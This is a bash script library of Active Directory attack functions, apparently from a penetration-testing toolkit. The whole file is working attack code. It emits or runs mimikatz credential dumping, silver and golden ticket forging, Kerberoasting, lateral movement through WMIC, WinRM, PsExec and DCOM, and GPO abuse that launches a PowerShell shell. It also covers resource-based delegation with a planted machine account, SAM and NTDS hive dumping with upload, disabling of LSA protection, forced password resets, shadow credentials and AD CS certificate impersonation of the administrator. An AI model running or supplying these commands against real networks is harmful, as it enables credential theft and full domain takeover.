#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/password_cracking.sh"
source "$SCRIPTDIR/impacket.sh"
source "$SCRIPTDIR/mimikatz.sh"
source "$SCRIPTDIR/hashcat.sh"
source "$SCRIPTDIR/kerbrute.sh"
source "$SCRIPTDIR/ldap.sh"

download_spray_passwords() {
    if [[ ! -f "Spray-Passwords.ps1" ]]; then
        cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
    fi
    generate_windows_download Spray-Passwords.ps1

}

download_crackmapexec_windows() {
    local crackmapexec_url="https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-windows-latest-3.10.1.zip"
    if [[ ! -f "cme-windows-latest-3.10.1.zip" ]]; then
        wget "$crackmapexec_url" -O cme-windows-latest-3.10.1.zip >> $trail_log
    fi
    if [[ ! -f "cme.exe" ]]; then
        unzip cme-windows-latest-3.10.1.zip >> $trail_log
        mv cme cme.exe
    fi
    generate_windows_download cme.exe
}

download_rubeus() {
    if [[ ! -f "Rubeus.exe" ]]; then
        #cp /usr/share/windows-resources/rubeus/Rubeus.exe .
        cp $SCRIPTDIR/../../tools/Rubeus/Rubeus/bin/Release/Rubeus.exe .
    fi
    generate_windows_download Rubeus.exe
}

perform_kerberoast_rubeus() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    download_rubeus
    echo '.\Rubeus.exe kerberoast /outfile:'$hash_file';'
    upload_file $hash_file
}

perform_silverticket_windows() {
    if [[ -z "$username" ]] || [[ -z "$domain" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, domain, and target IP/host address must be set before running SilverTicket command."
        return 1
    fi
    if [[ -z "$target_service" ]]; then
        target_service="http"
    fi
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_silverticket.log"
    fi
    echo '$sid = whoami /user | findstr '$username' | ForEach-Object {$parts = $_.Split('"' '"'); $parts[1]} | ForEach-Object {$last_index=$_.LastIndexOf('"'-'"'); $_.Substring(0,$last_index)}'
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > '"$mimikatz_log"';'
    echo '$mimikatz_log = Get-Content '$mimikatz_log' -Raw;'
    echo '$matches = $mimikatz_log | Select-String -Pattern "(?s)iis_service.*?SHA1"'
    echo '$ntlm_hash = $matches.Matches.Value | findstr NTLM | ForEach-Object {$last_index=$_.LastIndexOf('"':'"'); $_.SubString($last_index+2)}'
    echo '$username = "'$username'"'
    echo '$domain = "'$domain'"'
    echo '$target = "'$target_hostname'"'
    echo '$target_service = "'$target_service'"'
    echo '.\mimikatz.exe "kerberos::golden /sid:$sid /domain:$domain /ptt /target:$target /service:$target_service /rc4:$ntlm_hash /user:$username" exit'

}

perform_impacket_silverticket() {
    output=$(run_impacket_lookupsid)
    domain_sid=$(echo "$output" | grep -oP 'Domain SID is: \K[^:]+')

}

get_wmic_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local wmic_command="wmic /node:$target_ip /user:$username /password:$password process call create \"$cmd\""
    echo "$wmic_command"
}

get_wmic_powershell_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='$options = New-CimSessionOption -Protocol DCOM;'
    powershell_commands+='$session = New-Cimsession -ComputerName '$target_ip' -Credential $credential -SessionOption $Options;'
    powershell_commands+='$command = '"'$cmd';"
    powershell_commands+='Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};'
    echo "$powershell_commands"

}

get_winrs_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WinRM cmd is required."
        return 1
    fi
    local winrs_command="winrs -r:$target_ip -u:$username -p:$password \"$cmd\""
    echo "$winrs_command"
}

get_powershell_remoting_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='New-PSSession -ComputerName '$target_ip' -Credential $credential;'
    #powershell_commands+='Enter-PSSession 1'
    echo "$powershell_commands"
}

download_psexec() {
    local pstools_link="https://download.sysinternals.com/files/PSTools.zip"
    if [[ ! -f  "PSTools.zip" ]]; then
        wget "$pstools_link" -O PSTools.zip >> $trail_log
    fi
    if [[ -z "$PsExec_exe" ]]; then
        PsExec_exe="PsExec.exe"
    fi
    if [[ ! -d "pstools" ]]; then
        unzip -u PSTools.zip -d pstools >> $trail_log
    fi
    generate_windows_download "pstools/$PsExec_exe" "$PsExec_exe"
}

get_psexec_command() { 
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, password, and target hostname address must be set before running PsExec command."
        return 1
    fi
    echo '--- PSExec criteria ---'
    echo 'credentials must be part of local administrators group'
    echo 'ADMIN$ share must be enabled'
    echo 'File and Printer Sharing must be enabled'
    local psexec_username="$username"
    if [[ ! -z "$domain" ]]; then
        psexec_username="$domain\\$username"
    fi
    get_psexec
    local psexec_command=".\\$PsExec_exe -u $psexec_username -p $password -i \\\\$target_hostname cmd"
    echo "$psexec_command"

}

get_dcom_command() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP address must be set before running DCOM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "DCOM cmd is required."
        return 1
    fi
    local powershell_command='$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","'$target_ip'"));'
    powershell_command+='$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c '$cmd'", "7")'
    echo "$powershell_command"   
}

perform_golden_ticket_windows() {
    target_username=krbtgt
    if ! get_ntlm_hash_from_mimikatz_log_lsadump; then
        echo "Failed to extract NTLM hash for $target_username."
        return 1
    fi
    if [[ -z "$domain_sid" ]]; then
        echo "Domain SID is not set, cannot create golden ticket."
        return 1
    fi
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash is not set, cannot create golden ticket."
        return 1
    fi
    get_mimikatz
    get_psexec
    echo '.\mimikatz.exe "kerberos::purge" exit'
    echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
}

perform_golden_ticket_linux() {
    run_impacket_golden_ticket
}

get_perform_gpo_changeowner_windows_command() {
    if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$target_gpo" ]]; then
        echo "GPO owner username, password, and target IP address must be set before running GPO abuse."
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running GPO abuse."
        return 1
    fi
    get_powerview
    echo "\$SecPassword = ConvertTo-SecureString '$gpo_owner_password' -AsPlainText -Force"
    echo "\$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$gpo_owner_username', \$SecPassword)"
    echo "Set-DomainObjectOwner -Credential \$Cred -Identity '$target_gpo' -OwnerIdentity $domain\\$target_username"
}

perform_gpo_abuse_linux() {
    if [[ ! -d "gpo_abuse" ]]; then
        echo "Creating gpo_abuse directory..."
        mkdir -p "gpo_abuse"
    fi
    if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$gpo_id" ]]; then
        echo "GPO owner username, password, and GPO id must be set before running GPO abuse."
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address must be set before running GPO abuse."
        return 1
    fi
    if [[ ! -d pyGPOAbuse ]]; then
        git clone https://github.com/Hackndo/pyGPOAbuse.git
    fi
    if [[ -z "$cmd" ]]; then
        echo "Command file already exists, skipping command generation."
    else
        cmd=$(get_powershell_interactive_shell)
    fi
    pushd pyGPOAbuse || exit 1
    python3 pygpoabuse.py $domain/$gpo_owner_username:$gpo_owner_password -gpo-id $gpo_id -command "$cmd" -dc-ip $dc_ip -f
    popd || exit 1
}

perform_rbcd_linux() {
    if [[ -z "$controlled_computer_name" ]]; then
        echo "Assuming you don't have a controlled computer name"
    fi
    if [[ -z "$controlled_computer_pass" ]]; then
        echo "Assuming you don't have a controlled computer password"
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]]; then
        echo "Domain, username, password must be set before running RBCD."
        return 1
    fi
    if [[ -z "$password" ]] && [[ -z "$ntlm_hash" ]]; then
        echo "Password or NTLM hash must be set before running RBCD."
        return 1
    fi
    if [[ -z "$target_computer" ]]; then
        echo "Target computer must be set before running RBCD."
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address must be set before running RBCD."
        return 1
    fi
    local credentials="$domain/$username"
    if [[ ! -z "$password" ]]; then
        credentials="$credentials:'$password'"
    elif [[ ! -z "$ntlm_hash" ]]; then
        credentials="$credentials -hashes :$ntlm_hash"
    fi
    if [[ ! -z "$controlled_computer_name" ]] && [[ ! -z "$controlled_computer_pass" ]]; then
        echo "Using controlled computer name: $controlled_computer_name"
    else
        controlled_computer_name='ATTACKERSYSTEM$'
        controlled_computer_pass='Summer2018!'
        addcomputer.py -computer-name "$controlled_computer_name" -computer-pass "$controlled_computer_pass" -dc-host $dc_ip -domain-netbios $domain $credentials
    fi
    if [[ -z "$msdsspn" ]]; then
        #allows us to use psexec
        msdsspn="cifs/$target_computer.$domain"
    fi
    rbcd.py -delegate-from "$controlled_computer_name" -delegate-to "$target_computer\$" -dc-ip "$dc_ip" -action 'write' $credentials
    getST.py -spn "$msdsspn" -impersonate 'Administrator' -dc-ip "$dc_ip" "$domain/$controlled_computer_name:$controlled_computer_pass"
    krb5="Administrator@$msdsspn@${domain^^}.ccache"
    krb5=$(echo "$krb5" | sed 's/\//_/g')
    export KRB5CCNAME="$krb5"
    echo "KRB5CCNAME set to $KRB5CCNAME"
    target_ip=$target_computer.$target_domain

}

perform_rbcd_windows() {

    download_powerview
    download_rubeus
    download_powermad
    echo 'New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)'
    echo '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
    echo '$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" '
    echo '$SDBytes = New-Object byte[] ($SD.BinaryLength)'
    echo '$SD.GetBinaryForm($SDBytes, 0)'
    if [[ -z $target_computer ]]; then
        echo "Target computer must be set before running S4U2Self impersonation."
        return 1
    fi
    echo "\$TargetComputer = \"$target_computer\""
    echo "Get-DomainComputer \$TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=\$SDBytes}"
    echo './Rubeus.exe hash /password:Summer2018!'
    if [[ -z $target_rc4 ]]; then
        echo "Target RC4 hash must be set before running S4U2Self impersonation."
        return 1
    fi
    if [[ -z $target_username ]]; then
        echo "Target user must be set before running S4U2Self impersonation."
        return 1
    fi
    if [[ -z $target_domain ]]; then
        echo "Target domain must be set before running S4U2Self impersonation."
        return 1
    fi
    echo "./Rubeus.exe s4u /user:attackersystem$ /rc4:$target_rc4 /impersonateuser:$target_username /msdsspn:cifs/$target_computer.$target_domain /ptt /nowrap"
    if [[ -f administrator.kirbi.base64 ]]; then
        if [[ ! -f administrator.kirbi ]]; then
            base64 -d administrator.kirbi.base64 > administrator.kirbi
        fi
        if [[ ! -f administrator.ccache ]]; then
            ticketConverter.py administrator.kirbi administrator.ccache
        fi
    fi
    export KRB5CCNAME="administrator.ccache"
    target_ip=$target_computer.$target_domain

}

# WinRM runs on 5985 by default
run_evil_winrm() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP is not set. Please set it before running"
        return 1        
    fi
    local username_option=""
    if [[ -z "$username" ]]; then
        echo "Username is not set. Please set it before running"
        return 1        
    fi
    username_option="-u $username"
    local password_option=""
    if [[ -z "$password" ]] || [[ $password == "''" ]]; then
        echo "Password is not set. Ensure you are passing hashes"        
        if [[ -z "$ntlm_hash" ]]; then
            echo "NTLM hash is not set. Please set it before running"
            return 1
        else
            password_option="-H ${ntlm_hash^^}"
        fi  
    else
        password_option="-p '$password'"        
    fi
    local test_username=$(echo "$username" | sed -E 's/([$])/\\\1/g')
    if pgrep -f "evil-winrm -i $target_ip -u $test_username"; then
        echo "Evil-WinRM is already running for $target_ip, $username"
        return 0
    fi
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running evil-winrm with proxychains"
    else
        proxychain_command=""
    fi
    echo ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option"
    eval ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $log_dir/evil_winrm_${target_ip}.log)

}   

perform_target_kerberoast() {
    echo "Running Kerberoasting..."
    local url="https://github.com/ShutdownRepo/targetedKerberoast/archive/refs/heads/main.zip"
    local targetedKerberoast_dir="targetedKerberoast"
    if [[ ! -d $targetedKerberoast_dir ]]; then
        echo "Downloading targetedKerberoast..."
        wget -q -O "$targetedKerberoast_dir.zip" "$url"
        unzip -q "$targetedKerberoast_dir.zip"
        mv targetedKerberoast-main "$targetedKerberoast_dir"
        rm "$targetedKerberoast_dir.zip"
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target user is not set. Please set it before running"
        return 1
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, password must be set before running"
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address is not set. Please set it before running"
        return 1
    fi
    if [[ -z $hash_file ]]; then
        hash_file="hashes.$target_username"
    elif [[ -f $hash_file ]]; then
        echo "Hash file $hash_file already exists, skipping targetedKerberoast execution."
        return 0
    fi
    pushd "$targetedKerberoast_dir" || exit 1
    python3 targetedKerberoast.py -v -d "$domain" -u "$username" -p "$password" --dc-ip "$dc_ip" -o "$hash_file"
    popd || exit 1
    if [[ -f "$targetedKerberoast_dir/$hash_file" ]]; then
        cp -f "$targetedKerberoast_dir/$hash_file" .
    fi
}

get_regsave_commands() {

    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname must be set before running get_regsave_commands"
        return 1
    fi
    if [[ -z "$target_sam" ]]; then
        target_sam=$target_hostname.sam.hive
        echo "No target SAM provided, using default $target_sam"
    fi
    if [[ -z "$target_system" ]]; then
        target_system=$target_hostname.system.hive
        echo "No target SYSTEM provided, using default $target_system"
    fi
    echo "reg save hklm\system $target_system"
    echo "reg save hklm\sam $target_sam"
    upload_file $target_system
    upload_file $target_sam
    if [[ -z $target_security ]]; then
        target_security=$target_hostname.security.hive
        echo "No target SECURITY provided, using default $target_security"
    fi
    echo "reg save hklm\security $target_security"
    upload_file "$target_security"
}

get_ntdsutil_commands() {
    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname must be set before running get_ntdsutil_commands"
        return 1
    fi
    if [[ -z "$target_system" ]]; then
        target_system=$target_hostname.system.hive
        echo "No target SYSTEM provided, using default $target_system"        
    fi
    if [[ -z "$target_ntds" ]]; then
        target_ntds=$target_hostname.ntds.dit
        echo "No target NTDS provided, using default $target_ntds"
    fi
    echo 'ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit;'
    upload_file "${target_ntds}" "c:\windows\temp\NTDS\Active Directory\ntds.dit"
    upload_file "${target_system}" "c:\windows\temp\NTDS\registry\SYSTEM"

}

enable_rdp_commands() {
    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /d 0 /t REG_DWORD'
    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPLBoot /d 0 /t REG_DWORD'
    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /d 0 /t REG_DWORD'
    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
}

#change password using powerview

change_password_powerview() {
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running"
        return 1
    fi
    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
        echo "You need to set the target username and password."
        return 1
    fi
    download_powerview
    echo "\$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force"
    echo "\$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$username', \$SecPassword)"
    echo "\$UserPassword = ConvertTo-SecureString '$target_password' -AsPlainText -Force"
    echo "Set-DomainUserPassword -Identity $target_username -AccountPassword \$UserPassword -Credential \$Cred"
}

#change password using samba net

change_password_samba() {
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running"
        return 1
    fi
    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
        echo "You need to set the target username and password."
        return 1
    fi
    if [[ -z "$dc_host" ]]; then
        echo "DC host is not set."
        return 1
    fi

    local samba_command="net rpc password -d 0 '$target_username' '$target_password' -U '$domain'/'$username'%'$password' -S '$dc_host'"
    echo "$samba_command"
    eval "$samba_command" | tee -a $log_dir/samba_password_change.log

}


perform_shadow_credentials_exe() {
    echo "Performing shadow credentials..."
    if [[ -z "$target_username" ]]; then
        target_username="Administrator"
        echo "No target username provided, using default $target_username"
    fi
    cp $SCRIPTDIR/../../tools/Whisker/Whisker-main/Whisker/bin/Release/Whisker.exe .
    generate_windows_download Whisker.exe
    echo ".\Whisker.exe add /target:$target_username"
}
#shadow credentials
#ca/pki needs to be setup to do this

perform_shadow_credentials() {
    local url="https://github.com/ShutdownRepo/pywhisker/archive/refs/heads/main.zip"
    local pywhisker_dir="pywhisker"
    if [[ ! -d $pywhisker_dir ]]; then
        echo "Downloading pywhisker..."
        wget -q -O "$pywhisker_dir.zip" "$url"
        unzip -q "$pywhisker_dir.zip"
        mv pywhisker-main "$pywhisker_dir"
        rm "$pywhisker_dir.zip"
    fi
    pywhisker_dir="$pywhisker_dir/pywhisker"
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running"
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running"
        return 1
    fi
    pushd "$pywhisker_dir" || exit 1
    echo python3 pywhisker.py -d "$domain" -u "$username" -p "$password" --target "'$target_username'" --action "add"
    local result=$(python3 pywhisker.py -d "$domain" -u "$username" -p "$password" --target "'$target_username'" --action "add")
    local pfx_file=$(echo "$result" | grep -oP 'at path: \K.*')
    local pfx_password=$(echo "$result" | grep -oP 'with password: \K.*')
    popd || exit 1
    if [[ -z "$pfx_file" ]] || [[ -z "$pfx_password" ]]; then
        echo "Failed to retrieve PFX file or password."
        return 1
    fi    
    url="https://github.com/dirkjanm/PKINITtools/archive/refs/heads/master.zip"
    local pkinittools_dir="PKINITtools"
    if [[ ! -d $pkinittools_dir ]]; then
        echo "Downloading PKINITtools..."
        wget -q -O "$pkinittools_dir.zip" "$url"
        unzip -q "$pkinittools_dir.zip"
        mv PKINITtools-master "$pkinittools_dir"
        rm "$pkinittools_dir.zip"
    fi
    if [[ -z $ccache_file ]]; then
        ccache_file="${domain}_${target_username}.ccache"
    fi
    pushd "$pkinittools_dir" || exit 1
    python3 gettgtpkinit.py -cert-pfx ../$pywhisker_dir/$pfx_file -pfx-pass $pfx_password "$domain/$target_username" "$ccache_file"
    popd || exit 1
}

perform_adcsesc1() {
    if [[ -z $username ]]; then
        echo "Username is not set. Please set it before running"
        return 1        
    fi
    if [[ -z $domain ]]; then
        echo "Domain is not set. Please set it before running"
        return 1        
    fi
    if [[ -z $password ]]; then
        echo "Password is not set. Please set it before running"
        return 1        
    fi
    if [[ -z $dc_ip ]]; then
        echo "DC IP is not set. Please set it before running"
        return 1        
    fi
    PATTERN="*Certipy.txt"
    for file in $PATTERN; do
        if [[ -e "$file" ]]; then
            echo "$file already exists, skipping AD CS data collection."
            ca_name=$(cat "$file" | grep 'CA Name' | awk -F': ' '{print $2}')
            echo "Using CA Name: $ca_name"
            if [[ -z $template_name ]]; then
                template_name=$(cat "$file" | grep 'Template Name' | awk -F': ' '{print $2}')
                echo "Using Template Name: $template_name"
            fi
            break
        else
            echo "No existing AD CS data found, proceeding with data collection."
            certipy-ad find -u $username@$domain -p "$password" -dc-ip $dc_ip -vulnerable -enabled
        fi
    done
    if [[ -z $ca_name ]]; then
        echo "CA name is not set. Please set it before running"
        return 1        
    fi    
    if [[ ! -f "adcs_esc1_req.cer.pfx" ]]; then
        echo "No existing certificate request found, proceeding with request."
        certipy-ad req -u $username@$domain -p "$password" -ca $ca_name -target $target_ip -template $template_name -upn administrator@$domain -out adcs_esc1_req.cer
    else
        echo "Certificate request already exists, skipping request generation."
    fi
    if [[ ! -f 'administrator.ccache' ]]; then
        echo "No existing ccache file found, proceeding with ticket generation."
        certipy-ad auth -pfx adcs_esc1_req.cer.pfx -dc-ip $dc_ip
    else
        echo "Ccache file already exists, skipping ticket generation."
    fi
}